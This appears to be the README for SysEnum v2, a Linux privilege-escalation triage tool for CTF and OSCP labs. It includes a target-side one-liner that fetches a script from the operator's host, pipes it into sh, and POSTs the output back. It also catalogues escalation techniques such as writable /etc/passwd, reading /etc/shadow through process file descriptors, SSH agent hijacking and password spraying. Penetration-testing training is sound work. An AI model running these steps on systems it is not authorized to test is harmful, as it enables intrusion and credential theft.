# SysEnum v2

> Linux privesc triage that doesn't waste your exam clock.
> One shell line on target → prioritized attack plan + manual-hunt playbook in your browser.
>
> By [@Mahdiesta · xl337x](https://github.com/xl337x/linprivesc)

`linpeas` and `lse` give you 3000 lines of output that you then read by hand under exam pressure. SysEnum v2 replaces that with:
- a structured collector that runs **everywhere** (BusyBox/Alpine → RHEL),
- an offline rule engine with **96 data fields**, **40+ auto-rules**, and a **Manual Hunt tab** for the tricks CTF authors hide on purpose.

---

## Architecture

```
┌───────────────────────┐    one base64 line     ┌────────────────────────┐
│  sysenum_collect.sh   │ ────────────────────▶  │  sysenum_operator.html │
│  (target — POSIX sh)  │                        │     (Kali — offline)   │
└───────────────────────┘                        └────────────────────────┘
            │                                                ▲
            │  optional: curl POST /collect                  │
            ▼                                                │
┌───────────────────────────────────────────────────────────┐│
│                       SysEnum.py                          │┘
│  serves sc.sh + lse/linpeas/LinEnum, hosts operator,      │
│  captures payloads, auto-opens browser                    │
└───────────────────────────────────────────────────────────┘
```

Three files in `SysEnum/`:

| File | Runs on | Purpose |
|---|---|---|
| `sysenum_collect.sh` | target | Pure `/bin/sh`, zero deps. Emits one `SYSENUM_DATA:…` line. Auto-runs lse/LinEnum/linpeas if Kali base URL is detected. |
| `sysenum_operator.html` | Kali | Offline single-file rule engine + GTFOBins + Manual Hunt playbook + sub-pages for every command output. |
| `SysEnum.py` | Kali | HTTP server. Hosts the collector, the operator, third-party enum scripts, and a `/collect` endpoint. |

---

## Install

### Option A — git clone (recommended)

```bash
git clone https://github.com/xl337x/linprivesc.git
cd linprivesc
chmod +x SysEnum/sysenum_collect.sh
```

### Option B — tarball

```bash
curl -sL https://github.com/xl337x/linprivesc/archive/refs/heads/main.tar.gz | tar xz
cd linprivesc-main
chmod +x SysEnum/sysenum_collect.sh
```

### Option C — zip

```bash
wget https://github.com/xl337x/linprivesc/archive/refs/heads/main.zip
unzip main.zip
cd linprivesc-main
chmod +x SysEnum/sysenum_collect.sh
```

No Python dependencies beyond the stdlib. No JS libraries. No internet needed at run-time once cloned.

### Optional: cache third-party enum scripts

The collector can auto-run `lse.sh`, `LinEnum.sh`, and `linpeas.sh` on target and push their output back, but you need them locally first. `SysEnum.py` will fetch them on first run if you choose **Cache management → Download all missing tools**, or pre-place them:

```bash
mkdir -p ~/.sysenum/cache/linux
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \
     -o ~/.sysenum/cache/linux/linpeas.sh
curl -sL https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh \
     -o ~/.sysenum/cache/linux/lse.sh
curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh \
     -o ~/.sysenum/cache/linux/LinEnum.sh
```

---

## Three ways to use it

### Mode A — Auto pipeline (recommended)

Start the server on Kali:

```bash
python3 SysEnum/SysEnum.py
# → choose interface (tun0 if VPN), Linux, /tmp
```

Copy the printed SysEnum v2 one-liner and run it on target:

```bash
# on target:
curl -s http://10.10.14.1:PORT/sc.sh | sh | curl -s -X POST --data-binary @- http://10.10.14.1:PORT/collect
```

What happens:

1. Target downloads the collector and runs it (≤120s normally; up to ~10 min if it also runs lse/LinEnum/linpeas via the auto-fetch path).
2. Collector POSTs back to Kali.
3. Kali stores it in `/tmp/sysenum_latest.json`, injects it into the served operator HTML, and auto-opens `http://127.0.0.1:PORT/op`.
4. Browser shows prioritized attack paths + checklist + Manual Hunt playbook.

### Mode B — Manual paste

If the target can't reach Kali (NAT, locked egress):

```bash
# on target (skip auto-tool fetch — just core enum, ~60-90s):
curl -s http://10.10.14.1:PORT/sc.sh -o /tmp/sc.sh
sh /tmp/sc.sh
# → copy the final line:  SYSENUM_DATA:H4sIAAAA…
```

Open `SysEnum/sysenum_operator.html` directly in a browser (no server needed) and paste into the **SYSENUM_DATA** box, click **ANALYZE**.

### Mode C — URL hash

```
file:///path/to/sysenum_operator.html#data=H4sIAAAA…
http://kali:PORT/op#data=H4sIAAAA…
```

Auto-loads and analyzes on open.

---

## The operator UI — six tabs

| Tab | What's there |
|---|---|
| **Summary** | user / distro / kernel / SELinux / noexec / container flag + top recommendation |
| **Attack Paths** | Auto-detected exploit paths, sorted by score (0–100). Each has VERIFY · EXPLOIT · CLEANUP · WARNINGS. Self-owned SUIDs collapse to a SKIP section. |
| **Checklist** | What ran, what was found, what's missing — at a glance |
| **Findings** | 48 sub-pages — one per category — every command output the collector grabbed |
| **Manual Hunt** | **26 guided playbooks** for the tricks CTF authors hide that no scanner can auto-detect |
| **Tool Output** | lse.sh / LinEnum.sh / linpeas.sh sub-pages (when auto-collected) |
| **Raw Data** | The full decoded payload for grepping |

---

## What's auto-detected

**Tier 0 — instant wins** *(score 99-100)*
- `/etc/ld.so.preload` writable (most generic tools miss it entirely)
- `/etc/passwd` writable / `/etc/sudoers` writable / `/etc/sudoers.d/*` writable
- `/etc/ld.so.conf.d/*` writable
- Docker daemon on TCP

**Tier 1 — fast confirmed paths**
- sudo NOPASSWD GTFOBins (60+ binaries)
- **sudo NOPASSWD + writable callee in same directory tree** *(the headline compound rule that made the engagement bomb-proof)*
- sudo NOPASSWD writable script
- sudo `env_keep+=LD_PRELOAD` / `SETENV`
- **sudo token reuse** — `sudo -v -n` cached credentials freebie
- Writable cron scripts
- Writable running binary that root executes (with pspy correlation)
- Docker group / docker.sock / LXD / disk group
- Capabilities — `cap_setuid` (per-binary table, special-cases `newuidmap`/`newgidmap`)
- Capabilities — `cap_dac_override` / `cap_dac_read_search`
- Writable SUID binary — **with owner check** (self-owned auto-skipped)
- MOTD / `/etc/profile.d/*` / `/etc/bash.bashrc` writable
- Writable RC files of OTHER users
- NFS `no_root_squash`
- Writable polkit `rules.d` / PAM module / NSS module
- Writable `sshd_config` / `AuthorizedKeysCommand` script
- SSH agent socket of another user (lateral)
- Writable logrotate config (`postrotate` hook)
- Writable Python `site-packages` (root-script import hijack)
- Cron `PATH=` override + writable early dir

**Tier 2 — listening-service archetypes**
- `mysqld` running as root → UDF / `INTO OUTFILE`
- `postgresql` → `COPY … FROM PROGRAM`
- Redis on local port → `CONFIG SET dir / authorized_keys`
- Jenkins on 8080/50000 → script console / `secrets/master.key`
- Docker daemon on TCP

**Tier 3 — container escape** *(when `/.dockerenv` or `cgroup` indicates container)*
- docker.sock mounted inside container
- Privileged container + cap_sys_admin → cgroup `release_agent`
- Host `/proc` mounted RW → `core_pattern`
- Kubernetes service-account token at `/var/run/secrets/...`

**Tier 4 — INVESTIGATE (never auto-CONFIRMED)**
- Sudo Baron Samedit (CVE-2021-3156) — numeric version compare, not string
- PwnKit (CVE-2021-4034) — checks polkit package version, not `pkexec --version`
- DirtyPipe (CVE-2022-0847) — kernel 5.8 ≤ k < 5.10.102/5.15.25/5.16.11
- **Looney Tunables (CVE-2023-4911)** — glibc heuristic for Ubuntu 22.04 / Debian 12 / RHEL 9
- **GameOver(lay) (CVE-2023-2640/32629)** — OverlayFS on Ubuntu
- **nf_tables (CVE-2024-1086)** — when module is loaded
- PATH-hijack candidates
- Bash history credential lines

Kernel exploits are **never** `CONFIRMED`. They crash boxes. The tool will tell you that.

---

## What needs the Manual Hunt tab

These are the categories scripts cannot solve. The Manual Hunt tab gives you copy-pasteable commands for each:

1. **Read every sudo-allowed script line by line** — `eval`, unquoted `$VAR`, relative commands, source-of-writable-file
2. **Strings-analyse every custom SUID** — `file`, `strings`, `ltrace`, `readelf -d`
3. **Walk non-standard trees** — `/opt /srv /var/www /var/lib /usr/local /data`
4. **Recently modified files** — narrow the window to 2 minutes, find live-firing crons
5. **Watch cron fire live** — `inotifywait` or a poll loop
6. **Open FDs of root processes** — read `/etc/shadow` via `/proc/<pid>/fd/<n>`
7. **Mistyped passwords in `/var/log/auth.log`** — admins type passwords into the username field
8. **Password spray everything** — su / sudo / ssh / mysql / smb / web auth with every plaintext you find
9. **Abandoned screen / tmux sessions** owned by other users
10. **Hijack SSH agent sockets** of other users (sign auth with their cached keys)
11. **Map every Unix socket** — docker.sock / mysql.sock / redis.sock with permissive ACLs
12. **Scan env + cmdline of every readable `/proc/<pid>`** — credentials in argv
13. **`/etc/shadow-` and `/etc/passwd-` backup files** — often world-readable when the originals aren't
14. **Database dumps on disk** — grep `.sql`/`.dump` for `password|admin|insert into user`
15. **`.git` history mining** for committed credentials
16. **Config files in `/opt /var/lib`** — jenkins/secrets/master.key, proftpd.conf, MySQL `user.MYD`
17. **Cron race conditions** — `tar`/`chown` wildcard in writable dir → `--checkpoint-action=exec`
18. **LD_AUDIT / GCONV_PATH** glibc tricks (sometimes survive SUID stripping on older systems)
19. **systemd `PathUnits`** watching writable paths
20. **D-Bus method probing** — `busctl introspect`
21. **Loaded kernel modules** + CVE lookup (`io_uring`, `ksmbd`, `overlay`, etc.)
22. **CUPS / printing service** (CVE-2024-47176 family)
23. **Hidden files** — leading-space names, `\n` in name (invisible to `ls`)
24. **Final sanity passes** — `sudo -ll`, `sudo -V`, slow-cron pspy (5 full minutes)

---

## Example walkthrough — HTB-style box

Target: Ubuntu 22.04, low-priv shell as `oracle`:

```
oracle$ id
uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba)

oracle$ curl -s http://10.10.14.1:46123/sc.sh | sh | curl -s -X POST \
        --data-binary @- http://10.10.14.1:46123/collect
[*] Kali base detected: http://10.10.14.1:46123 — auto-fetching enum scripts...
[*] Running lse.sh (timeout 180s)...
[*] Running LinEnum.sh (timeout 180s)...
[*] Running linpeas.sh (timeout 300s)...

SYSENUM_DATA:H4sIAAAAAA...
```

Browser auto-opens on Kali:

```
Summary
─────────────────────────────────────────────────────
 user oracle (uid 54321)   distro Ubuntu 22.04.3 LTS
 kernel 5.15.0-91-generic  SELinux absent
 confirmed 4   probable 2   investigate 3   skipped 5
─────────────────────────────────────────────────────
Top recommendation:
 [CONFIRMED] COMPOUND: sudo NOPASSWD /opt/oracle/.../root.sh
             + writable callee /opt/oracle/.../rootadd_rdbms.sh

Attack Paths
─────────────────────────────────────────────────────
[1] COMPOUND: sudo NOPASSWD ... + writable callee ...    ⏱ 2min  [CONFIRMED] score=97
     verify:   ls -la /opt/.../rootadd_rdbms.sh
     exploit:  (6-step guide w/ ownership-trap mitigation)
     cleanup:  cp /tmp/...bak ...; rm /tmp/rootbash

[2] sudo timestamp VALID — previous auth still cached    ⏱ 5s    [CONFIRMED] score=97
[3] /etc/passwd is writable                              ⏱ 30s   [CONFIRMED] score=100
[4] cap_setuid on /usr/bin/python3                       ⏱ 30s   [CONFIRMED] score=91
─────────────────────────────────────────────────────
```

Click **COPY ALL** on path [1]. Paste on target. Root in 2 minutes.

The skipped SUID `/opt/oracle/.../oracle` (oracle-owned) is correctly hidden — `cp /bin/bash` over a self-owned SUID escalates to *you*, which is useless.

---

## Compatibility

| Distro | Status |
|---|---|
| Alpine 3.x (BusyBox sh + base64) | works |
| Debian 9 / 10 / 11 / 12 | works |
| Ubuntu 16.04 → 24.04 | works |
| RHEL / CentOS 7 / 8 / 9 | works |
| Oracle Linux 8 (incl. UEK kernel) | works |
| Kali / ParrotOS | works |

Quirks handled automatically:
- `timeout` absent → no-op wrapper
- `gzip` absent → plain base64 fallback
- `getcap` not in `PATH` → searches `/sbin /usr/sbin /usr/local/sbin /usr/bin`
- `base64 -w0` not supported → uses `| tr -d '\n'`
- `stat -c` differs on BSD → uses `ls -ld` parsing
- `/proc/*/environ` unreadable → silently skipped
- `find` would cross filesystems → always `-xdev` + `timeout`
- Pipe-into-`while` subshell var bug → uses here-docs everywhere

---

## Bug fixes / decisions baked in

These come from a real engagement where the previous version misfired:

1. **SUID owner is now part of the data contract.** Self-owned SUIDs are SKIP, not CONFIRMED.
2. **Ownership trap warning** on every exploit using `cp /bin/bash /tmp/<name>` — always `rm -f /tmp/rootbash` *before* the trigger, always `ls -la /tmp/rootbash` to verify owner=root *after*.
3. **Text-file-busy fallback** — every running-binary replacement shows both the `kill+cp` and `dd … conv=notrunc` paths.
4. **cap_setuid binary type check** — `python3/perl/ruby/php/node` → CONFIRMED with the right one-liner; `newuidmap`/`newgidmap` → INVESTIGATE (need `unshare -U`, often blocked by SELinux/`kernel.unprivileged_userns_clone=0`).
5. **Compound rule: sudo NOPASSWD + writable callee in same dir tree.** This is what most engagements rely on and no other tool wires it up.
6. **Numeric kernel-version compare**, never string. `5.10` is NOT less than `5.8`.
7. **PwnKit checks polkit package version**, never `pkexec --version` (which doesn't bump on backport patches).
8. **Sudo Baron Samedit numeric compare** against 1.9.5p2.
9. **SELinux enforcing warning** appended to every confirmed path.
10. **Generous tool timeouts** — `LSE_TIMEOUT=180 LINENUM_TIMEOUT=180 LINPEAS_TIMEOUT=300` — overridable at invocation.

---

## Security & ROE

- **No telemetry.** Nothing leaves target except via the curl POST you choose.
- **No persistence on target.** Collector writes to `/tmp` only if you `-o`; piped mode writes nothing.
- **Defensive `-xdev` + timeouts.** Will not hang on NFS or `/proc` recursion.
- Operator HTML is fully offline. Open it from disk on a clean Kali and it works.

Use only against systems you are authorized to test (CTF labs, OSCP exam, written-scope engagements).

---

## File layout

```
linprivesc/
└── SysEnum/
    ├── SysEnum.py             # HTTP server + tool catalog
    ├── sysenum_collect.sh     # target-side collector (POSIX sh)
    ├── sysenum_operator.html  # offline operator UI
    └── SYSENUM_V2.md          # this file
```

---

## Honest limitations

The tool covers ~90% of common Linux privesc. The remaining 10% — service-specific RCE chains in unique apps, custom CTF logic puzzles, RE'd binaries with hardcoded backdoors, and the box where the intended path is finding a creds file the tool didn't know to look for — is what the **Manual Hunt** tab exists for. **No tool can guarantee root on every box.** This one hands you everything the human needs to find it fast.

---

## Credits

- Built by [@Mahdiesta · xl337x](https://github.com/xl337x/linprivesc)
- GTFOBins data — [gtfobins.github.io](https://gtfobins.github.io)
- Inspired by the noise problem with `linpeas` / `lse` / `LinEnum`

---

## License

See repository.
